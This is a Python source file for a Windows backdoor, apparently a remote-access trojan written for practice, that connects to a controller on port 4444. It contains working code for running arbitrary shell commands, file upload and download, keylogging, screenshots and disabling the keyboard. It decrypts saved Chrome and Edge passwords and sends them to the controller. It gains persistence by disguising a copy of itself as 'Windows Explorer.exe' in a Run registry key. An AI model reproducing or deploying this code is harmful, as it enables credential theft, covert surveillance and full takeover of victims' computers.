import socket
import subprocess,json
import os
import base64
import pynput
import pyautogui
import tempfile
import keyboard
import sys
import shutil
import re
import sqlite3
import win32crypt
from Crypto.Cipher import AES

class Backdoor:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.reliable_send("bakara")
        # self.add_persistent()
        self.keylogger_listener=None
        # self.keylogger_thread=None
        self.keylogger_log="Keylogger is off"
        self.keylogger_previous_command=""
    
    def Browser_data(self):

        def get_secret_key():
            try:
                with open( local_state_path, "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except Exception as e:
                # print("%s"%str(e)+"\n[ERR] Chrome secretkey cannot be found")
                # print("[ERR] Chrome secretkey cannot be found")
                return None

        def decrypt_password(ciphertext, secret_key):
            try:
                initialisation_vector = ciphertext[3:15]
                encrypted_password = ciphertext[15:-16]
                cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
                decrypted_pass = cipher.decrypt(encrypted_password)
                decrypted_pass = decrypted_pass.decode()  
                return decrypted_pass
            except Exception as e:
                # print("%s"%str(e))
                # print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
                return ""
            
        def get_db_connection(chrome_path_login_db):
            try:
                shutil.copy2(chrome_path_login_db, "Loginvault.db") 
                abc=sqlite3.connect("Loginvault.db")
                return abc
            except Exception as e:
                # print("%s"%str(e))
                # print("[ERR] Chrome database cannot be found")
                return None
                
        homepath = os.environ['USERPROFILE']
        browsers=[["chrome",homepath + r"\AppData\Local\Google\Chrome\User Data\Local State",homepath + r"\AppData\Local\Google\Chrome\User Data"],
                  ["edge",homepath + r"\AppData\Local\Microsoft\Edge\User Data\Local State",homepath + r"\AppData\Local\Microsoft\Edge\User Data"],
                  ]
        passwords = ""
        for browser_name,local_state_path,browser_path in browsers:
            try:
                passwords += "-"*50 + "\nBROWSER:%s\n"%browser_name + "-"*50
                secret_key = get_secret_key()
                
                folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
                    conn = get_db_connection(chrome_path_login_db)
                    if(secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(username!="" and ciphertext!=""):
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                passwords = passwords + "\nURL:%s \nUSERNAME:%s \nPASSWORD:%s\n"%(url, username, decrypted_password)+ "-"*50
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
                    else:
                        # print("[ERR] Unable to get secret key or database connection")
                        return "[-][ERR] Unable to get secret key or database connection"
            except Exception as e:
                # print("[ERR] %s"%str(e))
                return "[-][ERR] %s"%str(e)
        return passwords
    
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def add_persistent(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
            return "[+] Persistence added successfully"
        else:
            return "[-] Persistence already exists"
    
    def remove_persistence(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if os.path.exists(evil_file_location):
            os.remove(evil_file_location)
            subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',shell=True)
            return "[+] Persistence removed successfully"
        else:
            return "[-] Persistence does not exist"    
    
    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+path    
    
    def execute_system_command(self,command):
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    
    def read_file(self, path):
        with open(path, "rb") as file:
            binary_data = file.read()
            return base64.b64encode(binary_data).decode("utf-8")   
        
    def write_file(self,path,content):
        content=base64.b64decode(content)
        with open(path,"wb") as file:
            file.write(content)
            return "[+] Upload successful"
        
    def process_key_press(self,key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key=" "+str(key)+" "
        self.keylogger_log=self.keylogger_log+current_key
    
    def keylogger(self,command):
        if command == "on" and self.keylogger_previous_command != "on":
            self.keylogger_log = ""
            self.keylogger_previous_command = "on"
            def start_thread():
                keylogger_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
                keylogger_listener.start()
                return keylogger_listener
            
            self.keylogger_listener=start_thread()
            return "[+] Keylogger is on"
        
        elif command == "off" and self.keylogger_previous_command == "on":
            self.keylogger_previous_command = "off"
            self.keylogger_listener.stop()
            return "[+] Keylogger is off"
        elif command=="report":
            if self.keylogger_log=="Keylogger is off":
                return "[-] Keylogger is off"
            elif self.keylogger_log=="":
                return "[-] Keylogger is empty"
            else:
                return self.keylogger_log
        else:
            return "[-] Invalid command or Command is already executed"
            
    def screenshot(self):
        screenshot = pyautogui.screenshot()
        temp_directory = tempfile.gettempdir()
        current_working_directory = os.getcwd()
        os.chdir(temp_directory)
        file_path="screenshot.png"
        screenshot.save(file_path)
        taken_screenshot=self.read_file(file_path)
        os.remove(file_path)
        os.chdir(current_working_directory)
        return taken_screenshot
            
    def disable_keyboard(self):
        for i in range(150):
            keyboard.block_key(i)
        return "[+] Keyboard disabled"
    
    def enable_keyboard(self):
        for i in range(150):
            keyboard.unblock_key(i)
        return "[+] Keyboard enabled"
        
    def run(self):
        while True:
            try:
                command=self.reliable_receive()
                if command[0]=="exit":
                    self.reliable_send("[-] Exiting")
                    self.connection.close()
                    sys.exit()
                if command[0]=="persistent":
                    if command[1]=="add":
                        command_result=self.add_persistent()
                    elif command[1]=="remove":
                        command_result=self.remove_persistence()
                elif command[0]=="cd" and len(command)>1:
                    command_result=self.change_working_directory_to(command[1])
                elif command[0]=="download":
                    command_result=self.read_file(command[1])
                elif command[0]=="upload":
                    command_result=self.write_file(command[1],command[2])
                elif command[0]=="keylogger":
                    command_result=self.keylogger(command[1])
                elif command[0]=="screenshot":
                    command_result=self.screenshot()
                elif command[0]=="browser":
                    command_result=self.Browser_data()
                else:
                    command_result=self.execute_system_command(command).decode("utf-8")
            except Exception as e:
                # command_result="[-] Error during command execution from client side"
                command_result="[-] %s"%str(e)
            self.reliable_send(command_result)

my_backdoor=Backdoor("127.0.0.1",4444)
my_backdoor.run()